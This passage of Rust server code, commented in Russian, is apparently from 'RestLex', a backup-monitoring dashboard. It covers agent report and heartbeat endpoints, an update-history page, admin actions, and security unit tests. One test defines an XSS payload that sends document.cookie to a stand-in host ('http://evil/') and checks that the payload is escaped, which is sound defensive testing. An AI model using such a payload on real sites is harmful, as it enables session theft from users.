    cfg.tg_chat       = f.tg_chat.unwrap_or_default().trim().to_string();
    cfg.tg_group      = f.tg_group.unwrap_or_default().trim().to_string();
    cfg.stale_hours   = f.stale_hours.unwrap_or_default().trim().parse().unwrap_or(0.0_f64).max(0.0);
    if let Some(ak) = f.api_key.as_deref().filter(|s| !s.trim().is_empty()) {
        cfg.api_key = ak.trim().to_string();
    } else if f.api_key_clear.is_some() {
        cfg.api_key = String::new();
    }
    *st.cfg.lock().unwrap() = cfg.clone();
    save_config_off_thread(cfg).await;
    Json(serde_json::json!({"ok":true})).into_response()
}

#[derive(Deserialize)]
struct ReportPayload {
    profile: Option<String>,
    pid: Option<String>,
    status: Option<String>,
    operation_status: Option<String>,
    snapshot_id: Option<String>,
    started_at: Option<String>,
    duration_s: Option<serde_json::Value>,
    files_new: Option<serde_json::Value>,
    files_changed: Option<serde_json::Value>,
    bytes_added: Option<serde_json::Value>,
    total_bytes_processed: Option<serde_json::Value>,
    errors: Option<serde_json::Value>,
    source_paths: Option<serde_json::Value>,
    dest_path: Option<String>,
    host: Option<String>,
    agent_version: Option<String>,
    launcher_version: Option<String>,
}

async fn receive_report(State(st): State<AppState>, headers: HeaderMap,
    Json(payload): Json<ReportPayload>) -> impl IntoResponse {
    let cfg = st.cfg();
    if let Some(r) = deny_by_api_key(&cfg, &headers) { return r; }
    // Берём без move (as_deref/clone), чтобы payload целиком ушёл в spawn_blocking ниже.
    let profile = match payload.profile.as_deref() { Some(p) if !p.is_empty() => p.to_string(), _ =>
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"ok":false,"error":"missing profile"}))).into_response() };
    let status = payload.status.clone().unwrap_or_default();

    // Вся работа с SQLite (open + resolve_group + INSERT) блокирующая и с
    // busy_timeout может ждать до 5с под контеншеном — уносим в spawn_blocking,
    // чтобы не блокировать async-воркер tokio. Возвращаем готовый JSON SSE-события.
    let db_state = st.clone();
    let auto_group = cfg.auto_group;
    let event = tokio::task::spawn_blocking(move || -> Result<Option<String>, String> {
        let db = db_state.db().map_err(|e| format!("db pool: {e}"))?;

        // Heartbeat — это не результат бэкапа, а «агент жив, вот моя версия».
        // В reports ему не место: он рисовал строку-призрак с профилем "—".
        if status == "heartbeat" || payload.pid.as_deref() == Some("__heartbeat__") {
            let now = chrono::Local::now().format("%Y-%m-%dT%H:%M:%S%.3f").to_string();
            let host = payload.host.clone().unwrap_or_default();
            let mut agent_ver = payload.agent_version.clone().unwrap_or_default();
            let mut launcher_ver = payload.launcher_version.clone().unwrap_or_default();
            if let Some((l, a)) = agent_ver.clone().split_once('/') {
                if launcher_ver.is_empty() {
                    launcher_ver = l.trim().to_string();
                }
                agent_ver = a.trim().to_string();
            }
            if !host.is_empty() {
                if let Err(e) = db.execute(
                    "INSERT INTO host_info(host, gui_version, agent_version, last_seen) VALUES(?1, ?2, ?3, ?4) \
                     ON CONFLICT(host) DO UPDATE SET gui_version=excluded.gui_version, agent_version=excluded.agent_version, last_seen=excluded.last_seen",
                    params![host, launcher_ver, agent_ver, now],
                ) {
                    tracing::warn!("host_info(heartbeat) upsert failed for {host}: {e}");
                }
            }
            return Ok(None);   // ни строки в reports, ни SSE-события
        }

        let gid = resolve_group(&db, &profile, auto_group);

        let to_i = |v: Option<serde_json::Value>| v.and_then(|x| x.as_i64()).unwrap_or(0);
        let to_json = |v: Option<serde_json::Value>| match v {
            Some(serde_json::Value::Array(_)) => serde_json::to_string(&v.unwrap()).unwrap_or_default(),
            _ => "[]".into(),
        };

        let now = chrono::Local::now().format("%Y-%m-%dT%H:%M:%S%.3f").to_string();
        let started_at   = payload.started_at.unwrap_or_default();
        let host         = payload.host.unwrap_or_default();
        let mut agent_ver    = payload.agent_version.unwrap_or_default();
        let mut launcher_ver = payload.launcher_version.unwrap_or_default();
        // agent_version may carry legacy composite "launcher/agent" — split it.
        // Prefer explicit launcher_version field if non-empty; otherwise take the prefix.
        if let Some((l, a)) = agent_ver.split_once('/') {
            if launcher_ver.is_empty() {
                launcher_ver = l.trim().to_string();
            }
            agent_ver = a.trim().to_string();
        }
        let dur          = to_i(payload.duration_s);
        let files_new    = to_i(payload.files_new);
        let files_chg    = to_i(payload.files_changed);
        let bytes_added  = to_i(payload.bytes_added);
        let total_bytes  = to_i(payload.total_bytes_processed);
        let errors_json  = to_json(payload.errors);
        if let Err(e) = db.execute(
            "INSERT INTO reports(received_at,profile,pid,status,operation_status,snapshot_id,started_at,duration_s,files_new,files_changed,bytes_added,total_bytes_processed,errors,source_paths,dest_path,host,agent_version,launcher_version,group_id) VALUES(?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?16,?17,?18,?19)",
            params![
                now, profile, payload.pid.unwrap_or_default(), status,
                payload.operation_status.unwrap_or_default(),
                payload.snapshot_id.unwrap_or_default(),
                started_at, dur, files_new, files_chg, bytes_added, total_bytes,
                errors_json, to_json(payload.source_paths),
                payload.dest_path.unwrap_or_default(),
                host, agent_ver, launcher_ver, gid,
            ],
        ) {
            tracing::error!("report INSERT failed for profile {profile}: {e}");
            return Err(format!("insert failed: {e}"));
        }
        // Broadcast SSE event to all connected web clients
        let (rel_gui, rel_agent) = released_versions();
        let event = serde_json::json!({
            "profile":               profile,
            "host":                  host,
            "status":                status,
            "started_at":            started_at,
            "received_at":           now,
            "duration_s":            dur,
            "bytes_added":           bytes_added,
            "files_new":             files_new,
            "files_changed":         files_chg,
            "total_bytes_processed": total_bytes,
            "errors":                errors_json,
            "agent_version":         agent_ver,
            "launcher_version":      launcher_ver,
            "released_gui":          rel_gui,
            "released_agent":        rel_agent,
        });
        Ok(Some(event.to_string()))
    }).await;

    match event {
        Ok(Ok(Some(ev))) => {
            let _ = st.sse_tx.send(ev);
            Json(serde_json::json!({"ok":true})).into_response()
        }
        // heartbeat: в reports не пишем, SSE не шлём, но для агента это успех
        Ok(Ok(None)) => Json(serde_json::json!({"ok":true})).into_response(),
        // 503, а не 500: агенту стоит повторить — БД могла быть просто занята
        Ok(Err(e)) => (StatusCode::SERVICE_UNAVAILABLE,
                       Json(serde_json::json!({"ok":false,"error":e}))).into_response(),
        Err(e) => {
            tracing::error!("report task panicked: {e}");
            (StatusCode::INTERNAL_SERVER_ERROR,
             Json(serde_json::json!({"ok":false,"error":"internal"}))).into_response()
        }
    }
}

// ── Update reports ────────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct UpdateReportPayload {
    component:    Option<String>,
    from_version: Option<String>,
    to_version:   Option<String>,
    host:         Option<String>,
    success:      Option<bool>,
    error:        Option<String>,
}

async fn receive_update_report(State(st): State<AppState>, headers: HeaderMap,
    Json(payload): Json<UpdateReportPayload>) -> impl IntoResponse {
    let cfg = st.cfg();
    if let Some(r) = deny_by_api_key(&cfg, &headers) { return r; }
    // Блокирующие записи в SQLite — в spawn_blocking (см. receive_report).
    let db_state = st.clone();
    let ok = tokio::task::spawn_blocking(move || -> bool {
        let Ok(db) = db_state.db() else { return false; };
        let now       = chrono::Local::now().format("%Y-%m-%dT%H:%M:%S%.3f").to_string();
        let component = payload.component.unwrap_or_default();
        let host      = payload.host.unwrap_or_default();
        let from_ver  = payload.from_version.unwrap_or_default();
        let to_ver    = payload.to_version.unwrap_or_default();
        let success   = payload.success.unwrap_or(true) as i64;

        // Boot heartbeat: upsert host_info, don't pollute update_reports history.
        // payload.from_version = launcher.version, payload.to_version = AGENT_VERSION.
        if component == "boot" {
            if let Err(e) = db.execute(
                "INSERT INTO host_info(host, gui_version, agent_version, last_seen) VALUES(?1, ?2, ?3, ?4) \
                 ON CONFLICT(host) DO UPDATE SET gui_version=excluded.gui_version, agent_version=excluded.agent_version, last_seen=excluded.last_seen",
                params![host, from_ver, to_ver, now],
            ) {
                tracing::warn!("host_info(boot) upsert failed for {host}: {e}");
                return false;
            }
            return true;
        }

        if let Err(e) = db.execute(
            "INSERT INTO update_reports(received_at,component,host,from_version,to_version,success,error) VALUES(?1,?2,?3,?4,?5,?6,?7)",
            params![now, component, host, from_ver, to_ver, success, payload.error],
        ) {
            tracing::warn!("update_report INSERT failed for {host}: {e}");
            return false;
        }
        // Real agent/gui successful update also implies a fresh known state — upsert host_info.
        if success == 1 && (component == "agent" || component == "gui") && !host.is_empty() && !to_ver.is_empty() {
            let col = if component == "agent" { "agent_version" } else { "gui_version" };
            let sql = format!(
                "INSERT INTO host_info(host, {col}, last_seen) VALUES(?1, ?2, ?3) \
                 ON CONFLICT(host) DO UPDATE SET {col}=excluded.{col}, last_seen=excluded.last_seen"
            );
            if let Err(e) = db.execute(&sql, params![host, to_ver, now]) {
                tracing::warn!("host_info upsert failed for {host}: {e}");
            }
        }
        true
    }).await.unwrap_or(false);

    if ok {
        Json(serde_json::json!({"ok":true})).into_response()
    } else {
        (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"ok":false}))).into_response()
    }
}

#[derive(Deserialize)]
struct CbStatusPayload {
    host: Option<String>,
    blocked_until: Option<i64>,
    fail_count: Option<u32>,
}

/// Агент шлёт текущее состояние circuit breaker обновлений → пишем в host_info.
async fn receive_cb_status(State(st): State<AppState>, headers: HeaderMap,
    Json(p): Json<CbStatusPayload>) -> impl IntoResponse {
    let cfg = st.cfg();
    if let Some(r) = deny_by_api_key(&cfg, &headers) { return r; }
    let host = p.host.unwrap_or_default();
    if host.is_empty() { return Json(serde_json::json!({"ok":true})).into_response(); }
    let blocked_until = p.blocked_until.unwrap_or(0);
    let fail_count = p.fail_count.unwrap_or(0) as i64;
    let now = chrono::Local::now().format("%Y-%m-%dT%H:%M:%S%.3f").to_string();
    let db_state = st.clone();
    let saved = tokio::task::spawn_blocking(move || {
        let Ok(db) = db_state.db() else { return false; };
        if let Err(e) = db.execute(
            "INSERT INTO host_info(host, update_blocked_until, update_fail_count, last_seen) VALUES(?1,?2,?3,?4) \
             ON CONFLICT(host) DO UPDATE SET update_blocked_until=excluded.update_blocked_until, \
             update_fail_count=excluded.update_fail_count, last_seen=excluded.last_seen",
            params![host, blocked_until, fail_count, now],
        ) {
            tracing::warn!("cb-status upsert failed for {host}: {e}");
            return false;
        }
        true
    }).await.unwrap_or(false);
    if saved { Json(serde_json::json!({"ok":true})).into_response() }
    else { (StatusCode::SERVICE_UNAVAILABLE, Json(serde_json::json!({"ok":false}))).into_response() }
}

/// Агент тянет команды для своего хоста (reset circuit breaker). Флаг потребляется.
async fn agent_commands(State(st): State<AppState>, headers: HeaderMap,
    Path(host): Path<String>) -> impl IntoResponse {
    let cfg = st.cfg();
    if let Some(r) = deny_by_api_key(&cfg, &headers) { return r; }
    let db_state = st.clone();
    let reset = tokio::task::spawn_blocking(move || -> bool {
        let Ok(db) = db_state.db() else { return false; };
        let pending: i64 = db.query_row(
            "SELECT cb_reset_requested FROM host_info WHERE host=?1",
            params![host], |r| r.get(0),
        ).unwrap_or(0);
        if pending != 0 {
            let _ = db.execute("UPDATE host_info SET cb_reset_requested=0, update_blocked_until=0, update_fail_count=0 WHERE host=?1", params![host]);
        }
        pending != 0
    }).await.unwrap_or(false);
    Json(serde_json::json!({"reset_circuit_breaker": reset})).into_response()
}

fn host_info_map(db: &Connection) -> HashMap<String, (String, String)> {
    let mut m = HashMap::new();
    if let Ok(mut stmt) = db.prepare("SELECT host, gui_version, agent_version FROM host_info") {
        let it = stmt.query_map([], |r| Ok((
            r.get::<_, String>(0)?,
            r.get::<_, String>(1)?,
            r.get::<_, String>(2)?,
        )));
        if let Ok(rows) = it {
            for row in rows.flatten() {
                m.insert(row.0, (row.1, row.2));
            }
        }
    }
    m
}

async fn updates_page(State(st): State<AppState>, headers: HeaderMap) -> Response {
    if let Some(r) = require_viewer_redirect(&st, &headers, "/updates").await { return r; }
    let admin = is_admin(&st, &headers);
    let csrf = csrf_token(&st, &headers);
    let username = current_username(&st, &headers).unwrap_or_default();
    let lang = Lang::from_headers(&headers);
    blocking_page(move || updates_page_html(lang, &st, admin, &csrf, &username)).await
}

fn updates_page_html(lang: Lang, st: &AppState, admin: bool, csrf: &str, username: &str) -> Response {
    let csrf_in = csrf_field(csrf);
    let Ok(db) = st.db() else { return Html("<p>DB error</p>".to_string()).into_response() };
    let theme = load_theme(&db, username);
    if let Err(e) = mark_updates_seen(&db, username) {
        tracing::warn!("Не удалось отметить просмотр журнала обновлений: {e}");
    }

    struct UpdateRow {
        id:           i64,
        received_at:  String,
        component:    String,
        host:         String,
        from_version: String,
        to_version:   String,
        success:      i64,
        error:        Option<String>,
    }

    let rows: Vec<UpdateRow> = db.prepare(
        "SELECT id,received_at,component,host,from_version,to_version,success,error FROM update_reports ORDER BY received_at DESC LIMIT 500"
    ).ok().map(|mut s| s.query_map([], |r| Ok(UpdateRow {
        id:           r.get(0)?,
        received_at:  r.get::<_,Option<String>>(1)?.unwrap_or_default(),
        component:    r.get::<_,Option<String>>(2)?.unwrap_or_default(),
        host:         r.get::<_,Option<String>>(3)?.unwrap_or_default(),
        from_version: r.get::<_,Option<String>>(4)?.unwrap_or_default(),
        to_version:   r.get::<_,Option<String>>(5)?.unwrap_or_default(),
        success:      r.get::<_,Option<i64>>(6)?.unwrap_or(1),
        error:        r.get(7)?,
    })).ok().map(|it| it.flatten().collect()).unwrap_or_default()).unwrap_or_default();

    // Хосты с активной блокировкой обновлений (circuit breaker).
    struct BlockedHost { host: String, blocked_until: i64, fail_count: i64, reset_pending: i64 }
    let now_ts = now_unix();
    let blocked: Vec<BlockedHost> = db.prepare(
        "SELECT host, update_blocked_until, update_fail_count, cb_reset_requested FROM host_info WHERE update_blocked_until > ?1 ORDER BY update_blocked_until DESC"
    ).ok().map(|mut s| s.query_map(params![now_ts], |r| Ok(BlockedHost {
        host:          r.get::<_,Option<String>>(0)?.unwrap_or_default(),
        blocked_until: r.get::<_,Option<i64>>(1)?.unwrap_or(0),
        fail_count:    r.get::<_,Option<i64>>(2)?.unwrap_or(0),
        reset_pending: r.get::<_,Option<i64>>(3)?.unwrap_or(0),
    })).ok().map(|it| it.flatten().collect()).unwrap_or_default()).unwrap_or_default();

    let mut blocked_rows = String::new();
    for b in &blocked {
        let action = if b.reset_pending != 0 {
            t(lang, r#"<span style="color:#d97706;font-size:.83rem">⏳ сброс запрошен — применится на ближайшем цикле</span>"#).to_string()
        } else if admin {
            format!(r#"<form method=post action="/updates/cb-reset/{h}" style="margin:0">{csrf_in}<button class="btn btn-sm" style="color:#0369a1;border-color:#7dd3fc;background:#f0f9ff" type=submit>🔓 {reset}</button></form>"#, h = url_enc(&b.host), csrf_in = csrf_in, reset = t(lang, "Сбросить"))
        } else { String::new() };
        blocked_rows.push_str(&fill(t(lang,
            r#"<tr style="border-bottom:1px solid #f0f0f0;background:#fff5f5"><td style="padding:5px 10px;font-weight:600">{host}</td><td style="padding:5px 10px;white-space:nowrap;color:#dc2626">🔒 до {until}</td><td style="padding:5px 10px">{fails}</td><td style="padding:5px 10px">{action}</td></tr>"#),
            &[("host", &esc(&b.host)), ("until", &fmt_unix(b.blocked_until)), ("fails", &b.fail_count.to_string()), ("action", &action)]));
    }
    let blocked_html = if blocked.is_empty() {
        t(lang, r#"<p style="color:#16a34a;padding:8px 0">✅ Нет хостов с заблокированными обновлениями</p>"#).to_string()
    } else {
        fill(t(lang, r#"<div class=tbl-wrap><table style="width:100%;border-collapse:collapse">
<thead><tr style="background:var(--navy);color:#fff"><th style="padding:6px 10px;text-align:left">Хост</th><th style="padding:6px 10px;text-align:left;width:160px">Заблокировано</th><th style="padding:6px 10px;text-align:left;width:90px">Неудач</th><th style="padding:6px 10px;text-align:left;width:240px">Действие</th></tr></thead><tbody>{blocked_rows}</tbody></table></div>"#), &[("blocked_rows", &blocked_rows)])
    };

    let err_count = count_update_errors(&db, username);
    let col_extra = if admin { 1 } else { 0 };
    let total_cols = 7 + col_extra;

    let th_del = if admin { r#"<th style="padding:6px 8px;width:36px"></th>"# } else { "" };
    let mut tbl = fill(t(lang, concat!(
        r#"<table id=updates-history style="width:100%;border-collapse:collapse;min-width:700px">"#,
        r#"<thead><tr style="background:var(--navy);color:#fff">"#,
        r#"<th style="padding:6px 10px;text-align:left;white-space:nowrap;width:160px">Время</th>"#,
        r#"<th style="padding:6px 10px;text-align:left">Хост</th>"#,
        r#"<th style="padding:6px 10px;text-align:left;width:90px">Компонент</th>"#,
        r#"<th style="padding:6px 10px;text-align:left;white-space:nowrap;width:110px">Было</th>"#,
        r#"<th style="padding:6px 10px;text-align:left;white-space:nowrap;width:110px">Стало</th>"#,
        r#"<th style="padding:6px 10px;text-align:left;width:80px">Статус</th>"#,
        r#"<th style="padding:6px 10px;text-align:left">Ошибка</th>"#,
        r#"{th_del}</tr></thead><tbody>"#,
    )), &[("th_del", th_del)]);

    for r in &rows {
        let ts = fmt_ts(&r.received_at);
        let from_cell = if r.from_version.is_empty() { "—".to_string() } else { format!(r#"<code style="font-size:.8rem">{}</code>"#, esc(&r.from_version)) };
        let to_cell   = if r.to_version.is_empty()   { "—".to_string() } else { format!(r#"<code style="font-size:.8rem">{}</code>"#, esc(&r.to_version)) };
        let (status_html, row_bg, update_status, hidden) = if r.success == 1 {
            (r#"<span style="color:#16a34a;font-weight:600">✅ OK</span>"#.to_string(), "", "success", " class=hidden-row")
        } else {
            (t(lang, r#"<span style="color:#dc2626;font-weight:600">❌ Ошибка</span>"#).to_string(), "background:#fff5f5;", "errors", "")
        };
        let err_cell = r.error.as_deref().map(|e| esc(e)).unwrap_or_default();
        let del_cell = if admin {
            format!(r#"<td style="padding:3px 6px"><form method=post action="/updates/{}/delete" style="margin:0">{csrf_in}<button class="btn btn-sm" style="color:#dc2626;border-color:#fca5a5;padding:1px 6px" title="{}" data-confirm="{}">🗑</button></form></td>"#, r.id, t(lang, "Удалить запись"), t(lang, "Удалить эту запись?"), csrf_in = csrf_in)
        } else { String::new() };
        tbl.push_str(&format!(
            r#"<tr data-update-status="{update_status}"{hidden} style="border-bottom:1px solid #f0f0f0;{row_bg}"><td style="padding:5px 10px;font-size:.83rem;white-space:nowrap">{ts}</td><td style="padding:5px 10px">{host}</td><td style="padding:5px 10px;font-weight:600;text-transform:capitalize">{comp}</td><td style="padding:5px 10px">{from_cell}</td><td style="padding:5px 10px">{to_cell}</td><td style="padding:5px 10px">{status_html}</td><td style="padding:5px 10px;font-size:.8rem;color:#dc2626;max-width:280px;word-break:break-word">{err_cell}</td>{del_cell}</tr>"#,
            host = esc(&r.host), comp = esc(&r.component),
        ));
    }
    tbl.push_str(&fill(t(lang, r#"<tr id=updates-filter-empty style="display:none"><td colspan={total_cols} style="padding:30px;text-align:center;color:#64748b">Ошибок обновления нет</td></tr>"#),
        &[("total_cols", &total_cols.to_string())]));
    tbl.push_str("</tbody></table>");

    let clear_btn = if admin {
        fill(t(lang, r#"<form method=post action=/updates/clear style="display:inline">{csrf_in}<button class="btn" style="color:#dc2626;border-color:#fca5a5" data-confirm="Очистить всю историю обновлений?">🗑 Очистить всё</button></form>"#), &[("csrf_in", &csrf_in)])
    } else { String::new() };

    let filters = t(lang, r#"<div class="filter-strip" id="updates-filters" aria-label="Фильтры истории обновлений">
<span class="filter-strip-label">История обновлений:</span>
<button class="filter-chip active" data-mode="errors" aria-pressed=true onclick="setUpdatesFilter('errors')">Ошибки</button>
<button class="filter-chip" data-mode="all" aria-pressed=false onclick="setUpdatesFilter('all')">Все</button>
<button class="filter-chip" data-mode="success" aria-pressed=false onclick="setUpdatesFilter('success')">Успешные</button>
<span class="filter-count" id="updates-filter-count"></span></div>"#);

    Html(fill(t(lang, r#"<!doctype html><html lang=ru><head><meta charset=utf-8><title>RestLex — Обновления</title>{CSS}</head><body class="theme-{theme}">
 {nav}
<div class=container>
<div class="page-title">🔒 Заблокированные обновления</div>
<div class=group style="margin-bottom:18px">{blocked_html}</div>
<div class="page-title">🔄 История обновлений</div>
<div class="toolbar">{clear_btn}</div>
<div class=group><div class=tbl-wrap>{tbl}</div></div>
</div>{JS_BLOCK}</body></html>"#), &[
        ("CSS", CSS),
        ("theme", theme),
        ("nav", &nav(lang, admin, nav_home(lang), filters, err_count, theme, csrf)),
        ("blocked_html", &blocked_html),
        ("clear_btn", &clear_btn),
        ("tbl", &tbl),
        ("JS_BLOCK", t(lang, JS_BLOCK)),
    ])).into_response()
}

async fn updates_clear(State(st): State<AppState>, headers: HeaderMap, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    if let Ok(db) = st.db() {
        let _ = db.execute("DELETE FROM update_reports", []);
    }
    Redirect::to("/updates").into_response()    }).await
}

async fn updates_delete(State(st): State<AppState>, headers: HeaderMap, Path(id): Path<i64>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    if let Ok(db) = st.db() {
        let _ = db.execute("DELETE FROM update_reports WHERE id=?1", params![id]);
    }
    Redirect::to("/updates").into_response()    }).await
}

/// Админ запрашивает сброс circuit breaker обновлений на хосте. Реальный сброс
/// произойдёт, когда агент заберёт команду на ближайшем цикле проверки (за NAT
/// прямого доступа нет).
async fn updates_cb_reset(State(st): State<AppState>, headers: HeaderMap, Path(host): Path<String>, Form(c): Form<CsrfForm>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    if !csrf_ok(&st, &headers, c.csrf.as_deref()) { return csrf_reject(); }
    blocking_page(move || {
    if let Ok(db) = st.db() {
        let _ = db.execute("UPDATE host_info SET cb_reset_requested=1 WHERE host=?1", params![host]);
    }
    Redirect::to("/updates").into_response()    }).await
}


// ── Тесты security-путей ─────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sqlite_pools_reuse_connections_and_bound_concurrent_writes() {
        let dir = std::env::temp_dir().join(format!("restlex-pool-{}", new_session_token()));
        std::fs::create_dir(&dir).unwrap();
        let main = DbPool::new(dir.join("main.db"), 2);
        let sessions = DbPool::new(dir.join("sessions.db"), 2);
        main.get().unwrap().execute_batch("CREATE TABLE entries(n INTEGER)").unwrap();
        sessions.get().unwrap().execute_batch("CREATE TABLE entries(n INTEGER)").unwrap();
        // cache_size — настройка соединения, поэтому сохранение значения
        // доказывает повторное использование того же checkout.
        let single = DbPool::new(dir.join("single.db"), 1);
        single.get().unwrap().execute_batch("PRAGMA cache_size=1234").unwrap();
        assert_eq!(single.get().unwrap().query_row("PRAGMA cache_size", [], |r| r.get::<_, i64>(0)).unwrap(), 1234);

        let mut workers = Vec::new();
        for n in 0..24 {
            let pool = if n % 2 == 0 { main.clone() } else { sessions.clone() };
            workers.push(std::thread::spawn(move || {
                for _ in 0..10 {
                    pool.get().unwrap().execute("INSERT INTO entries(n) VALUES(?1)", params![n]).unwrap();
                }
            }));
        }
        for worker in workers { worker.join().unwrap(); }
        assert_eq!(main.get().unwrap().query_row("SELECT COUNT(*) FROM entries", [], |r| r.get::<_, i64>(0)).unwrap(), 120);
        assert_eq!(sessions.get().unwrap().query_row("SELECT COUNT(*) FROM entries", [], |r| r.get::<_, i64>(0)).unwrap(), 120);
        assert!(main.0.inner.lock().unwrap().opened <= 2);
        assert!(sessions.0.inner.lock().unwrap().opened <= 2);
        assert_eq!(main.get().unwrap().query_row("PRAGMA journal_mode", [], |r| r.get::<_, String>(0)).unwrap(), "wal");
        assert_eq!(sessions.get().unwrap().query_row("PRAGMA busy_timeout", [], |r| r.get::<_, i64>(0)).unwrap(), 5000);
        drop((main, sessions, single));
        std::fs::remove_dir_all(dir).unwrap();
    }

    fn row(profile: &str, started_at: &str) -> ReportRow {
        ReportRow {
            id: 1,
            profile: profile.to_string(),
            host: Some("host1".into()),
            status: "success".into(),
            started_at: Some(started_at.to_string()),
            received_at: "2026-01-01T00:00:00".into(),
            duration_s: 1,
            bytes_added: 1,
            files_new: 1,
            files_changed: 0,
            total_bytes_processed: 0,
            snapshot_id: None,
            errors: Some("[]".into()),
            group_name: None,
            agent_version: None,
            launcher_version: None,
        }
    }

    /// Значение из отчёта агента не должно попадать в исполняемый JS-контекст.
    /// Раньше оно подставлялось в onclick="return confirm('...')", и апостроф
    /// (даже как &#39;) закрывал JS-строку: XSS в сессии администратора.
    #[test]
    fn report_row_never_puts_report_data_into_js() {
        let payload = "a'); fetch('http://evil/?c='+document.cookie); //";
        let html = report_row_ext(Lang::Ru, &row(payload, "2026-01-01T10:00:00"), false, 24.0, Some("tok"), false);
        // никаких inline-обработчиков в строке отчёта
        assert!(!html.contains("onclick="), "inline-обработчик вернулся: {html}");
        assert!(!html.contains("onsubmit="));
        // сырой апостроф из данных в разметку не попадает
        assert!(!html.contains("a');"), "сырой апостроф в разметке: {html}");
        assert!(html.contains("&#39;"));
        // Подтверждение удаления находится в истории и остаётся HTML-атрибутом.
        let delete_form = profile_delete_form(Lang::Ru, payload, "tok");
        assert!(delete_form.contains("data-confirm="));
        assert!(!delete_form.contains("onclick="));
        assert!(!delete_form.contains("a');"));
    }

    #[test]
    fn delete_all_is_only_in_profile_history() {
        let report = row("Бэкап-1", "2026-01-01T10:00:00");
        let dashboard = report_row_ext(Lang::Ru, &report, false, 24.0, Some("tok"), false);
        assert!(dashboard.contains("href=\"/history/"));
        assert!(!dashboard.contains("action-delete-all"));
        assert!(!dashboard.contains("/admin/profiles/"));
        assert!(!dashboard.contains("/admin/reports/"));
        let viewer = report_row_ext(Lang::Ru, &report, false, 24.0, None, false);
        assert!(!viewer.contains("action-delete-all"));
        let history = report_row_ext(Lang::Ru, &report, true, 24.0, Some("tok"), true);
        assert!(history.contains("/admin/reports/"));
        assert!(!history.contains("/admin/profiles/"));
        let delete_all = profile_delete_form(Lang::Ru, "Бэкап-1", "tok");
        assert!(delete_all.contains("action=\"/admin/profiles/"));
        assert!(delete_all.contains("name=csrf value=\"tok\""));
        assert!(delete_all.contains("data-confirm="));
    }

    #[test]
    fn update_badge_counts_only_unseen_failures_for_each_user() {
        let db = Connection::open_in_memory().unwrap();
        db.execute_batch("CREATE TABLE update_reports(id INTEGER PRIMARY KEY,success INTEGER NOT NULL); \
            CREATE TABLE update_view_state(username TEXT PRIMARY KEY,last_seen_id INTEGER NOT NULL); \
            INSERT INTO update_reports(id,success) VALUES(1,0),(2,1),(3,0);").unwrap();
        assert_eq!(count_update_errors(&db, "alice"), 2);
        mark_updates_seen(&db, "alice").unwrap();
        assert_eq!(count_update_errors(&db, "alice"), 0);
        assert_eq!(count_update_errors(&db, "bob"), 2);
        db.execute("INSERT INTO update_reports(id,success) VALUES(4,0)", []).unwrap();
        assert_eq!(count_update_errors(&db, "alice"), 1);
        mark_updates_seen(&db, "alice").unwrap();
        assert_eq!(count_update_errors(&db, "alice"), 0);
    }

    #[test]
    fn collapsed_groups_are_loaded_per_user() {
        let db = Connection::open_in_memory().unwrap();
        db.execute_batch("CREATE TABLE user_ui_state(username TEXT PRIMARY KEY,collapsed_groups TEXT NOT NULL);").unwrap();
        store_collapsed_groups(&db, "alice", &["org:Север".into(), "ungrouped".into()]).unwrap();
        store_collapsed_groups(&db, "bob", &["org:Юг".into()]).unwrap();
        let alice = load_collapsed_groups(&db, "alice");
        assert!(alice.contains("org:Север"));
        assert!(alice.contains("ungrouped"));
        assert!(!alice.contains("org:Юг"));
        assert_eq!(load_collapsed_groups(&db, "bob").len(), 1);
        assert!(load_collapsed_groups(&db, "charlie").is_empty());
        store_collapsed_groups(&db, "alice", &["org:Запад".into()]).unwrap();
        assert_eq!(load_collapsed_groups(&db, "alice"), HashSet::from(["org:Запад".into()]));
        assert_eq!(load_collapsed_groups(&db, "bob").len(), 1);
    }

    #[test]
    fn theme_is_saved_per_user_without_changing_collapsed_groups() {
        let db = Connection::open_in_memory().unwrap();
        db.execute_batch("CREATE TABLE user_ui_state(username TEXT PRIMARY KEY,collapsed_groups TEXT NOT NULL DEFAULT '[]',theme TEXT NOT NULL DEFAULT 'light');").unwrap();
        store_collapsed_groups(&db, "alice", &["org:Север".into()]).unwrap();
        store_theme(&db, "alice", "graphite").unwrap();
        store_theme(&db, "bob", "graphite").unwrap();
        assert_eq!(load_theme(&db, "alice"), "graphite");
        assert_eq!(load_theme(&db, "bob"), "graphite");
        assert_eq!(load_theme(&db, "charlie"), "light");
        assert!(load_collapsed_groups(&db, "alice").contains("org:Север"));
        store_theme(&db, "alice", "light").unwrap();
        assert_eq!(load_theme(&db, "alice"), "light");
        assert_eq!(load_theme(&db, "bob"), "graphite");
    }

    /// esc() обязан закрывать все пять символов, значимых в HTML-атрибуте.
    #[test]
    fn esc_covers_quote_and_apostrophe() {
        assert_eq!(esc("<a href=\"x\" b='y'>&"), "&lt;a href=&quot;x&quot; b=&#39;y&#39;&gt;&amp;");
    }

    /// «Дыра» перехода на летнее время: локального времени 02:30 в этот день не
    /// существует. Раньше and_local_timezone(..).unwrap() паниковал на каждом
    /// рендере — дашборд умирал навсегда, т.к. запись уже лежала в БД.
    #[test]
    fn fmt_stale_survives_dst_gap() {
        for ts in [
            "2026-03-29T02:30:00",
            "2026-03-08T02:30:00",
            "2026-10-25T02:30:00",
            "не дата",
            "",
        ] {
            let _ = fmt_stale(Lang::Ru, ts, 24.0);
        }
    }

    #[test]
    fn naive_to_local_never_panics() {
        let d = chrono::NaiveDate::from_ymd_opt(2026, 3, 29)
            .unwrap()
            .and_hms_opt(2, 30, 0)
            .unwrap();
        let _ = naive_to_local(d);
    }

    /// Referer-редирект: только относительные пути.
    #[test]
    fn redirect_rejects_external_referer() {
        assert!(is_safe_redirect("/"));
        assert!(is_safe_redirect("/history/db-prod"));
        assert!(!is_safe_redirect("https://evil.tld/"));
